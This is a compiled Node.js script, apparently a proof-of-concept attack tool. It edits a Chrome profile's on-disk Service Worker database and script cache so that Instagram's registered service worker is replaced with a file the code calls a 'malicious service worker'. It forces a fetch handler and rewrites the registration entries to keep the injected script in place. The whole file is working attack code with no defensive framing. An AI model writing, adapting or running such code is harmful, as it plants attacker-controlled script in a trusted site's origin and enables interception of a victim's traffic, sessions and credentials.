"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const diskCache_1 = require("./diskCache");
const serviceWorkerLevelDb_1 = require("./levelDb/serviceWorkerLevelDb");
const fs = require("fs");
const chromeServiceWorkerDir = String.raw `C:\Users\maxmf\AppData\Local\Google\Chrome\User Data\Default\Service Worker`;
diskCache_1.diskCache.setFileBase(chromeServiceWorkerDir + String.raw `\ScriptCache`);
(0, serviceWorkerLevelDb_1.setDbPath)(chromeServiceWorkerDir + String.raw `\Database`);
async function injectMaliciousServiceWorker() {
    const basicMaliciousServiceWorker = fs.readFileSync("dist/serviceWorker/sw.js", "utf-8");
    const registrations = await (0, serviceWorkerLevelDb_1.getRegistrations)("https://www.instagram.com/");
    for (let registration of registrations) {
        const newScriptUrl = registration.registration.value.getScriptUrl().replace(/\/[^\/]+$/, "/invalid.js");
        registration.registration.value.setScriptUrl(newScriptUrl);
        registration.registration.value.setHasFetchHandler(true);
        registration.registration.value.setLastUpdateCheckTime(13325671046262602);
        console.log(registration.registration.value.toObject());
        for (let { value: resourceRecord } of registration.resourceRecords) {
            resourceRecord.setUrl(newScriptUrl);
            console.log(resourceRecord.toObject());
            const diskCacheKey = `${resourceRecord.getResourceId()}`;
            const serviceWorkerContent = await diskCache_1.diskCache.get(diskCacheKey, diskCache_1.diskCache.Streams.ServiceWorkerScriptContent);
            serviceWorkerContent.body.value = basicMaliciousServiceWorker;
            console.log(serviceWorkerContent.body.value);
            await serviceWorkerContent.save();
            await diskCache_1.diskCache.remove(diskCacheKey, diskCache_1.diskCache.Streams.ServiceWorkerMetadata);
        }
        await (0, serviceWorkerLevelDb_1.saveRegistrationEntries)(registration.registration, ...registration.resourceRecords);
    }
}
injectMaliciousServiceWorker();
